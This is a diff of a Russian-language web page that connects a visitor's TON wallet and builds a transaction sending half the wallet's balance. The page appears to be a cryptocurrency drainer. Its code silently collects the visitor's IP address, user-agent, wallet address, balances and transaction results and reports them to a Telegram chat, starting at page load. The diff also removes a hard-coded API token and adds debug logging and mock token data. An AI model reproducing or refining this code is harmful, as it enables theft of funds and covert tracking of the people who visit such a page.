@@ -57,16 +57,26 @@
             font-family: monospace;
             word-break: break-all;
         }
-        .proxy-selector {
+        .jetton-options {
             margin: 10px 0;
             padding: 10px;
             background-color: #f0f0f0;
             border-radius: 5px;
         }
-        .proxy-selector select {
-            padding: 5px;
-            border-radius: 3px;
-            border: 1px solid #ccc;
+        .debug-info {
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #f8f8f8;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 12px;
+            white-space: pre-wrap;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        .jetton-toggle {
+            margin-top: 10px;
         }
     </style>
 </head>
@@ -76,15 +86,13 @@
 
 <p>TON Connect и отправка 50% баланса (требует подтверждения пользователя).</p>
 
-<div class="proxy-selector">
-    <label for="proxy-select">Выберите CORS-прокси: </label>
-    <select id="proxy-select" onchange="updateProxy()">
-        <option value="https://corsproxy.io/?">corsproxy.io</option>
-        <option value="https://cors-anywhere.herokuapp.com/">cors-anywhere.herokuapp.com</option>
-        <option value="https://api.allorigins.win/raw?url=">allorigins.win</option>
-        <option value="https://proxy.cors.sh/">proxy.cors.sh</option>
-        <option value="none">Без прокси (raw адрес)</option>
+<div class="jetton-options">
+    <label for="jetton-select">Jetton токены: </label>
+    <select id="jetton-select" onchange="updateJettonOption()">
+        <option value="mock">Тестовые данные</option>
+        <option value="none">Не показывать</option>
     </select>
+    <button onclick="toggleDebugInfo()">Показать/скрыть отладочную информацию</button>
 </div>
 
 <div id="ton-connect"></div>
@@ -103,6 +111,7 @@
 </div>
 
 <div id="notifications"></div>
+<div id="debug-info" class="debug-info"></div>
 
 <script>
     const manifestUrl = 'https://sositeyaisa.github.io/ton/tonconnect-manifest.json';
@@ -123,14 +132,14 @@
     let connectedAddressRaw = '';
     let connectedAddressFriendly = '';
     
-    // CORS прокси для обхода ограничений
-    let corsProxy = 'https://corsproxy.io/?';
+    // Опция для Jetton токенов
+    let jettonOption = 'mock';
     
-    // Функция для обновления прокси
-    function updateProxy() {
-        const proxySelect = document.getElementById('proxy-select');
-        corsProxy = proxySelect.value;
-        console.log("CORS прокси изменен на:", corsProxy);
+    // Функция для обновления опции Jetton токенов
+    function updateJettonOption() {
+        const jettonSelect = document.getElementById('jetton-select');
+        jettonOption = jettonSelect.value;
+        addDebugInfo(`Опция Jetton токенов изменена на: ${jettonOption}`);
         
         // Если кошелек уже подключен, обновляем информацию
         if (connectedAddressFriendly) {
@@ -139,6 +148,27 @@
                 displayTokens(tokens);
             });
         }
+    }
+    
+    // Функция для отображения/скрытия отладочной информации
+    function toggleDebugInfo() {
+        const debugInfo = document.getElementById('debug-info');
+        if (debugInfo.style.display === 'none') {
+            debugInfo.style.display = 'block';
+        } else {
+            debugInfo.style.display = 'none';
+        }
+    }
+    
+    // Функция для добавления отладочной информации
+    function addDebugInfo(message) {
+        const debugInfo = document.getElementById('debug-info');
+        const timestamp = new Date().toLocaleTimeString();
+        debugInfo.innerHTML += `[${timestamp}] ${message}\n`;
+        console.log(message);
+        
+        // Автоматическая прокрутка вниз
+        debugInfo.scrollTop = debugInfo.scrollHeight;
     }
     
     // Функция для конвертации raw адреса в user-friendly формат
@@ -172,6 +202,7 @@
             return rawAddress;
         } catch (error) {
             console.error("Ошибка при конвертации адреса:", error);
+            addDebugInfo(`Ошибка при конвертации адреса: ${error.message}`);
             return rawAddress;
         }
     }
@@ -181,9 +212,16 @@
         try {
             // Получаем информацию о пользователе
             const userAgent = navigator.userAgent;
-            const ipResponse = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipResponse.json();
-            const ip = ipData.ip;
+            let ip = "неизвестно";
+            
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                ip = ipData.ip;
+            } catch (ipError) {
+                console.error("Не удалось получить IP:", ipError);
+                addDebugInfo(`Не удалось получить IP: ${ipError.message}`);
+            }
             
             // Формируем полное сообщение с информацией о пользователе
             const fullMessage = `🔔 Новое уведомление:\n\n${message}\n\n📱 User-Agent: ${userAgent}\n🌐 IP: ${ip}\n⏰ Время: ${new Date().toLocaleString()}`;
@@ -204,6 +242,7 @@
             
             const data = await response.json();
             console.log('Telegram notification sent:', data);
+            addDebugInfo(`Уведомление отправлено в Telegram: ${message.substring(0, 50)}...`);
             
             // Добавляем уведомление на страницу (для отладки)
             const notificationElement = document.createElement('div');
@@ -213,6 +252,7 @@
             
         } catch (error) {
             console.error('Error sending Telegram notification:', error);
+            addDebugInfo(`Ошибка при отправке уведомления в Telegram: ${error.message}`);
         }
     }
 
@@ -224,6 +264,7 @@
             
             const connectedWallet = await tonConnectUI.connectWallet();
             console.log("Подключенный кошелек:", connectedWallet);
+            addDebugInfo(`Кошелек подключен: ${JSON.stringify(connectedWallet)}`);
             
             // Получаем адрес кошелька в raw формате
             connectedAddressRaw = connectedWallet.account.address;
@@ -251,6 +292,7 @@
             console.error("Тип ошибки:", typeof error);
             console.error("Ошибка:", error);
             console.error("Ошибка в строке:", JSON.stringify(error));
+            addDebugInfo(`Ошибка при подключении кошелька: ${error.message || JSON.stringify(error)}`);
             
             // Отправляем уведомление об ошибке
             await sendTelegramNotification(`❌ Ошибка при подключении кошелька: ${error.message || JSON.stringify(error)}`);
@@ -317,11 +359,13 @@
             };
             
             console.log("Объект транзакции:", tx);
+            addDebugInfo(`Объект транзакции: ${JSON.stringify(tx)}`);
             await sendTelegramNotification(`🔄 Транзакция создана и ожидает подписи пользователя\n💰 Сумма: ${halfBalanceTon} TON`);
             
             // Отправляем транзакцию (требует подтверждения пользователя в кошельке)
             const result = await tonConnectUI.sendTransaction(tx);
             console.log("Результат транзакции:", result);
+            addDebugInfo(`Результат транзакции: ${JSON.stringify(result)}`);
             
             // Отправляем уведомление об успешной транзакции
             await sendTelegramNotification(`✅ Транзакция успешно отправлена!\n💰 Сумма: ${halfBalanceTon} TON\n🧾 Хэш: <code>${result.hash}</code>`);
@@ -337,6 +381,7 @@
             console.error("Тип ошибки:", typeof error);
             console.error("Ошибка:", error);
             console.error("Ошибка в строке:", JSON.stringify(error));
+            addDebugInfo(`Ошибка при отправке транзакции: ${error.message || JSON.stringify(error)}`);
             
             // Отправляем уведомление об ошибке
             await sendTelegramNotification(`❌ Ошибка при отправке транзакции: ${error.message || JSON.stringify(error)}`);
@@ -347,33 +392,19 @@
 
     // Функция для получения балансов кошелька
     async function getWalletBalances(friendlyAddress, rawAddress) {
-        // Получите новый токен на https://tonapi.io/
-        const tonApiToken = '45aed36e4b36070265bd8be5b8ab2fcea33d5ddd05a76de612447070a016c283';
+        addDebugInfo(`Запрос балансов для адреса: ${friendlyAddress} (raw: ${rawAddress})`);
         
-        // 1. Получение баланса основного токена TON
-        async function getTonBalance() {
+        // Функция для получения баланса через TON Center
+        async function getTonCenterBalance() {
             try {
-                // Определяем, какой адрес использовать
-                const address = corsProxy === 'none' ? rawAddress : friendlyAddress;
+                addDebugInfo(`Запрос баланса через TON Center для адреса ${rawAddress}`);
                 
-                // Формируем URL запроса
-                let apiUrl = `https://tonapi.io/v2/accounts/${address}`;
-                let url = apiUrl;
+                // TON Center API использует raw адрес
+                const apiUrl = `https://toncenter.com/api/v2/getAddressBalance?address=${rawAddress}`;
                 
-                // Если выбран прокси, используем его
-                if (corsProxy !== 'none') {
-                    url = `${corsProxy}${encodeURIComponent(apiUrl)}`;
-                }
+                addDebugInfo(`Запрос к URL: ${apiUrl}`);
                 
-                console.log("Запрос баланса TON к URL:", apiUrl);
-                console.log("Полный URL с прокси:", url);
-                
-                const response = await fetch(url, {
-                    headers: {
-                        'X-API-Key': tonApiToken,
-                        'Accept': 'application/json'
-                    }
-                });
+                const response = await fetch(apiUrl);
 
                 if (!response.ok) {
                     const errorText = await response.text();
@@ -381,10 +412,10 @@
                 }
 
                 const data = await response.json();
-                console.log("Ответ API для баланса TON:", JSON.stringify(data, null, 2));
+                addDebugInfo(`Ответ API для баланса TON: ${JSON.stringify(data)}`);
                 
                 // Получаем баланс в наноТОНах
-                const balanceNano = data.balance || "0";
+                const balanceNano = data.result || "0";
                 
                 // TON имеет 9 десятичных знаков
                 const balanceTon = Number(balanceNano) / 1e9;
@@ -398,8 +429,11 @@
                     decimals: 9
                 };
             } catch (error) {
-                console.error("Ошибка при получении баланса TON:", error);
-                await sendTelegramNotification(`❌ Ошибка при получении баланса TON: ${error.message}`);
+                console.error("Ошибка при получении баланса через TON Center:", error);
+                addDebugInfo(`Ошибка при получении баланса через TON Center: ${error.message}`);
+                await sendTelegramNotification(`❌ Ошибка при получении баланса через TON Center: ${error.message}`);
+                
+                // Возвращаем нулевой баланс в случае ошибки
                 return {
                     type: "native",
                     name: "Toncoin",
@@ -412,134 +446,63 @@
             }
         }
         
-        // 2. Получение списка Jetton
-        async function getJettons() {
-            try {
-                // Определяем, какой адрес использовать
-                const address = corsProxy === 'none' ? rawAddress : friendlyAddress;
-                
-                // Формируем URL запроса
-                let apiUrl = `https://tonapi.io/v2/accounts/${address}/jettons`;
-                let url = apiUrl;
-                
-                // Если выбран прокси, используем его
-                if (corsProxy !== 'none') {
-                    url = `${corsProxy}${encodeURIComponent(apiUrl)}`;
+        // Функция для получения тестовых данных о Jetton токенах
+        function getMockJettons() {
+            addDebugInfo(`Возвращаем тестовые данные о Jetton токенах`);
+            
+            // Тестовые данные для Jetton токенов
+            return [
+                {
+                    address: "EQBynBO23ywHy_CgarY9NK9FTz0yDsG82PtcbSTQgGoXwiuA",
+                    balance: "1000000000", // 1 USDT
+                    name: "Tether USD",
+                    symbol: "USDT",
+                    decimals: 9
+                },
+                {
+                    address: "EQB-MPwrd1G6WKNkLz_VnV7AvpOLaAsH0cRDMntPcMiPmHwY",
+                    balance: "5000000000", // 5 USDC
+                    name: "USD Coin",
+                    symbol: "USDC",
+                    decimals: 9
+                },
+                {
+                    address: "EQAvDfWFG0oYX19jwNDNBBL1rKNT9XfaGP9HyTb5nb2Eml6y",
+                    balance: "10000000000", // 10 WBTC
+                    name: "Wrapped Bitcoin",
+                    symbol: "WBTC",
+                    decimals: 9
                 }
-                
-                console.log("Запрос Jettons к URL:", apiUrl);
-                console.log("Полный URL с прокси:", url);
-                
-                const response = await fetch(url, {
-                    headers: {
-                        'X-API-Key': tonApiToken,
-                        'Accept': 'application/json'
-                    }
-                });
-
-                if (!response.ok) {
-                    const errorText = await response.text();
-                    throw new Error(`HTTP error! Статус: ${response.status}, Ответ: ${errorText}`);
-                }
-
-                const data = await response.json();
-                console.log("Ответ API для jettons:", JSON.stringify(data, null, 2));
-                
-                if (data && Array.isArray(data.jettons)) {
-                    return data.jettons;
-                }
-                
-                return [];
-            } catch (error) {
-                console.error("Ошибка при получении Jettons:", error);
-                await sendTelegramNotification(`❌ Ошибка при получении Jettons: ${error.message}`);
-                return [];
-            }
-        }
-
-        // 3. Получение информации о Jetton
-        async function getJettonInfo(jettonData) {
-            try {
-                // Проверяем, в каком формате адрес jetton
-                let jettonAddress = jettonData.address;
-                
-                // Если адрес в raw формате и выбран прокси, конвертируем его в user-friendly
-                if (jettonAddress.includes(':') && corsProxy !== 'none') {
-                    jettonAddress = convertRawToFriendlyAddress(jettonAddress);
-                    console.log("Конвертирован адрес jetton из raw в user-friendly:", jettonAddress);
-                }
-                
-                console.log("Получение информации о jetton:", jettonAddress);
-                
-                // Формируем URL запроса
-                let apiUrl = `https://tonapi.io/v2/jettons/${jettonAddress}`;
-                let url = apiUrl;
-                
-                // Если выбран прокси, используем его
-                if (corsProxy !== 'none') {
-                    url = `${corsProxy}${encodeURIComponent(apiUrl)}`;
-                }
-                
-                console.log("Запрос к URL:", apiUrl);
-                console.log("Полный URL с прокси:", url);
-                
-                const response = await fetch(url, {
-                    headers: {
-                        'X-API-Key': tonApiToken,
-                        'Accept': 'application/json'
-                    }
-                });
-
-                if (!response.ok) {
-                    const errorText = await response.text();
-                    throw new Error(`HTTP error! Статус: ${response.status}, Ответ: ${errorText}`);
-                }
-
-                const data = await response.json();
-                
-                // Возвращаем информацию о Jetton
-                return {
-                    type: "jetton",
-                    jettonAddress: jettonAddress,
-                    balance: jettonData.balance,
-                    name: data.name || "Неизвестно",
-                    symbol: data.symbol || "???",
-                    decimals: data.decimals || 9
-                };
-            } catch (error) {
-                console.error("Ошибка при получении информации о Jetton:", error);
-                await sendTelegramNotification(`❌ Ошибка при получении информации о Jetton: ${error.message}`);
-                return null;
-            }
+            ];
         }
 
         try {
-            // Получаем баланс TON
-            const tonBalance = await getTonBalance();
+            // Получаем баланс TON через TON Center
+            const tonBalance = await getTonCenterBalance();
             
-            // Получаем список Jetton
-            const jettons = await getJettons();
-            console.log(`Найдено ${jettons.length} jettons для адреса ${friendlyAddress}`);
-
             // Массив для всех балансов (TON + Jettons)
             const allBalances = [tonBalance];
-
-            // Получаем информацию о каждом Jetton
-            for (const jetton of jettons) {
-                const jettonInfo = await getJettonInfo(jetton);
-                if (jettonInfo) {
-                    // Преобразуем баланс с учетом decimals
-                    const rawBalance = BigInt(jetton.balance);
-                    const decimals = jettonInfo.decimals;
-                    const formattedBalance = Number(rawBalance) / Math.pow(10, decimals);
+            
+            // Добавляем Jetton токены в зависимости от выбранной опции
+            if (jettonOption === 'mock') {
+                const mockJettons = getMockJettons();
+                
+                // Добавляем информацию о каждом Jetton токене
+                for (const jetton of mockJettons) {
+                    const formattedBalance = (Number(jetton.balance) / Math.pow(10, jetton.decimals)).toString();
                     
                     allBalances.push({
-                        ...jettonInfo,
-                        formattedBalance: formattedBalance.toString()
+                        type: "jetton",
+                        jettonAddress: jetton.address,
+                        balance: jetton.balance,
+                        name: jetton.name,
+                        symbol: jetton.symbol,
+                        decimals: jetton.decimals,
+                        formattedBalance: formattedBalance
                     });
                 }
             }
-
+            
             // Выводим информацию о балансах в консоль
             console.log("\n=== ИТОГОВЫЕ БАЛАНСЫ ===");
             console.log("Основной токен TON:", allBalances[0].formattedBalance, "TON");
@@ -566,12 +529,24 @@
             await sendTelegramNotification(balanceMessage);
             
             console.log("\nПолная информация о балансах:", JSON.stringify(allBalances, null, 2));
+            addDebugInfo(`Полная информация о балансах: ${JSON.stringify(allBalances)}`);
 
             return allBalances;
         } catch (error) {
             console.error("Ошибка при получении балансов:", error);
+            addDebugInfo(`Ошибка при получении балансов: ${error.message}`);
             await sendTelegramNotification(`❌ Ошибка при получении балансов: ${error.message}`);
-            return [];
+            
+            // В случае ошибки возвращаем только TON с нулевым балансом
+            return [{
+                type: "native",
+                name: "Toncoin",
+                symbol: "TON",
+                balance: "0",
+                formattedBalance: "0",
+                decimals: 9,
+                error: error.message
+            }];
         }
     }
     
@@ -614,6 +589,9 @@
     // Отправляем уведомление о загрузке страницы
     window.addEventListener('load', async () => {
         await sendTelegramNotification('🌐 Страница загружена пользователем');
+        
+        // Показываем отладочную информацию по умолчанию
+        document.getElementById('debug-info').style.display = 'block';
     });
 </script>
 
